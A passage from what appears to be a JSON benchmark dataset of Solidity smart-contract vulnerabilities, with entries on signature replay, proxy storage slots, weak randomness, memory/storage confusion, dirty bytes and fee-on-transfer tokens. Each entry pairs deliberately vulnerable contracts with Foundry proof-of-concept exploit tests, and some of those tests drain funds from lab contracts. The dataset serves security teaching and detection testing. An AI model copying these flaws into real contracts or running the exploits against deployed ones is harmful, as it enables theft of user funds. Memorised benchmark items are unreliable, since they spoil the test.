unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n            /*\n            Another mitigation\n            _balances[_id][_from] -= _amount;\n            _balances[_id][_to] += _amount;\n            */\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Missing Check for Self-Transfer Allows Funds to be Lost",
    "description": "The vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.",
    "scenario": "",
    "fix_description": "Add condition to prevent transfer between same addresses",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/self-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_immunefi_ch2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Immunefi_ch2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Immunefi_ch2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_signaturereplay",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SignatureReplay.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Signature Replay Vulnerability\n\nDescription:\nIn this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.\n\nMitigation:\nReplay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. \n\nREF:\nhttps://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57\nhttps://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25\n\n*/\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n    SixEyeToken SixEyeTokenContract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    constructor() {\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(this));\n        TokenWhaleContract.transfer(alice, 1000);\n        SixEyeTokenContract = new SixEyeToken();\n        SixEyeTokenContract.TokenWhaleDeploy(address(this));\n        SixEyeTokenContract.transfer(alice, 1000);\n    }\n\n    function testSignatureReplay() public {\n        emit log_named_uint(\n            \"Balance\",\n            TokenWhaleContract.balanceOf(address(this))\n        );\n\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                address(alice),\n                address(bob),\n                uint256(499),\n                uint256(1),\n                uint256(0)\n            )\n        );\n        emit log_named_bytes32(\"hash\", hash);\n\n        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v\n        //r - a point on the secp256k1 elliptic curve (32 bytes)\n        //s - a point on the secp256k1 elliptic curve (32 bytes)\n        //v - recovery id (1 byte)\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);\n        emit log_named_uint(\"v\", v);\n        emit log_named_bytes32(\"r\", r);\n        emit log_named_bytes32(\"s\", s);\n\n        address alice_address = ecrecover(hash, v, r, s);\n        emit log_named_address(\"alice_address\", alice_address);\n        emit log_string(\n            \"If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method.\"\n        );\n        vm.startPrank(bob);\n\n        TokenWhaleContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        // Bob successfully transferred funds from Alice.\n        emit log_named_uint(\n            \"SET token balance of Bob\",\n            TokenWhaleContract.balanceOf(address(bob))\n        );\n\n        // Because we have nonce protect to replay, so we can not replay again in the same contract.\n        // BTW this nonce start from 0, it's not a best practice.\n        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);\n        // emit log_named_uint(\"Balance of Bob\",TokenWhaleContract.balanceOf(address(bob)));\n\n        emit log_string(\n            \"Try to replay to another contract with same signature\"\n        );\n        emit log_named_uint(\n            \"Before the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the second replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n    }\n}\n\ncontract TokenWhale is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\ncontract SixEyeToken is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Six Eye Token\";\n    string public symbol = \"SIX\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        return true;\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "signature_replay",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Signature Replay Vulnerability",
    "description": "In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.",
    "scenario": "",
    "fix_description": "Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SignatureReplay.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_datalocation",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "DataLocation.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Data Location Confusion Vulnerability\n\nDescription:\nMisuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.\n\nMitigation:\nEnsure the correct usage of memory and storage in the function parameters. Make all the locations explicit.\n\nREF:\nhttps://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/\nhttps://www.educative.io/answers/storage-vs-memory-in-solidity\n\n*/\n\ncontract ContractTest is Test {\n    Array ArrayContract;\n\n    function testDataLocation() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(bob), 1 ether);\n        //vm.startPrank(alice);\n        ArrayContract = new Array();\n        ArrayContract.updaterewardDebt(100); // update rewardDebt to 100\n        (uint amount, uint rewardDebt) = ArrayContract.userInfo(address(this));\n        console.log(\"Non-updated rewardDebt\", rewardDebt);\n\n        console.log(\"Update rewardDebt with storage\");\n        ArrayContract.fixedupdaterewardDebt(100);\n        (uint newamount, uint newrewardDebt) = ArrayContract.userInfo(\n            address(this)\n        );\n        console.log(\"Updated rewardDebt\", newrewardDebt);\n    }\n\n    receive() external payable {}\n}\n\ncontract Array is Test {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "vulnerable_contract_only": "contract Array {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_misuse",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Data Location Confusion Vulnerability",
    "description": "Misuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.",
    "scenario": "",
    "fix_description": "Ensure the correct usage of memory and storage in the function parameters. Make all the locations explicit.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/DataLocation.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_dirtybytes",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Dirtybytes.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n// the issue is fixed in 0.8.15\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Dirtybytes in > Solidity 0.8.15\n    \"description\": \"Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. \n    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. \n    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,\n    i.e. such a push will not result in a zero value at the end of the array as expected. \n    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.\"\n    \n    \"link\": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/\n    \"fixed\": 0.8.15\n\n*/\n\ncontract ContractTest is Test {\n    Dirtybytes Dirtybytesontract;\n\n    function testDirtybytes() public {\n        Dirtybytesontract = new Dirtybytes();\n        emit log_named_bytes(\n            \"Array element in h() not being zero::\",\n            Dirtybytesontract.h()\n        );\n        console.log(\n            \"Such that the byte after the 63 bytes allocated below will be 0x02.\"\n        );\n    }\n}\n\ncontract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "vulnerable_contract_only": "contract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Dirtybytes in > Solidity 0.8.15",
    "description": "Dirtybytes in > Solidity 0.8.15",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Dirtybytes.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_randomness",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Randomness.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Predictable Randomness Vulnerability\n\nDescription:\nUse of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.\n\nScenario:\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n\nMitigation:\nDon't use blockhash and block.timestamp as source of randomness\n\nREF:\nhttps://solidity-by-example.org/hacks/randomness/\n \n*/\n\ncontract ContractTest is Test {\n    GuessTheRandomNumber GuessTheRandomNumberContract;\n    Attack AttackerContract;\n\n    function testRandomness() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.prank(alice);\n\n        GuessTheRandomNumberContract = new GuessTheRandomNumber{\n            value: 1 ether\n        }();\n        vm.startPrank(eve);\n        AttackerContract = new Attack();\n        console.log(\n            \"Before exploiting, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack(GuessTheRandomNumberContract);\n        console.log(\n            \"Eve wins 1 Eth, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n",
    "vulnerable_contract_only": "contract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "weak_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Predictable Randomness Vulnerability",
    "description": "Use of global variables like block hash, block number, \nblock timestamp and other fields is insecure, miner and attacker can control it.",
    "scenario": "GuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.",
    "fix_description": "Don't use blockhash and block.timestamp as source of randomness",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Randomness.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_fee-on-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "fee-on-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: STA token had a deflationary model with transfer fee of 1% charged from a recipient.\n\nDescription:\nThe actual deposited amount might be lower than the specified depositAmount of the function parameter.\n\nVulnVault: Incompatability with deflationary / fee-on-transfer tokens\n\nMitigation:  \nTransfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671084918506684418\nhttps://medium.com/1inch-network/balancer-hack-2020-a8f7131c980e\nhttps://twitter.com/BlockSecTeam/status/1600442137811689473\n*/\n\ncontract ContractTest is Test {\n    STA STAContract;\n    VulnVault VulnVaultContract;\n    Vault VaultContract;\n\n    function setUp() public {\n        STAContract = new STA();\n        VulnVaultContract = new VulnVault(address(STAContract));\n        VaultContract = new Vault(address(STAContract));\n    }\n\n    function testVulnFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VulnVaultContract), type(uint256).max);\n        VulnVaultContract.deposit(10000);\n        //VulnVaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000 STA, but Alice's STA balance in VulnVaultContract:\",\n            VulnVaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VulnVaultContract)),\n            VulnVaultContract.getBalance(alice)\n        );\n    }\n\n    function testFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VaultContract), type(uint256).max);\n        VaultContract.deposit(10000);\n        //VaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000, Alice's STA balance in VaultContract:\",\n            VaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VaultContract)),\n            VaultContract.getBalance(alice)\n        );\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        assert(b <= a);\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        assert(c >= a);\n        return c;\n    }\n\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n        uint256 c = add(a, m);\n        uint256 d = sub(c, 1);\n        return mul(div(d, m), m);\n    }\n}\n\nabstract contract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract STA is ERC20Detailed {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowed;\n\n    string constant tokenName = \"Statera\";\n    string constant tokenSymbol = \"STA\";\n    uint8 constant tokenDecimals = 18;\n    uint256 _totalSupply = 100000000000000000000000000;\n    uint256 public basePercent = 100;\n\n    constructor()\n        public\n        payable\n        ERC20Detailed(tokenName, tokenSymbol, tokenDecimals)\n    {\n        _issue(msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return _balances[owner];\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view returns (uint256) {\n        return _allowed[owner][spender];\n    }\n\n    function cut(uint256 value) public view returns (uint256) {\n        uint256 roundValue = value.ceil(basePercent);\n        uint256 cutValue = roundValue.mul(basePercent).div(10000);\n        return cutValue;\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(value <= _balances[msg.sender]);\n        require(to != address(0));\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[msg.sender] = _balances[msg.sender].sub(value);\n        _balances[to] = _balances[to].add(tokensToTransfer);\n\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        emit Transfer(msg.sender, 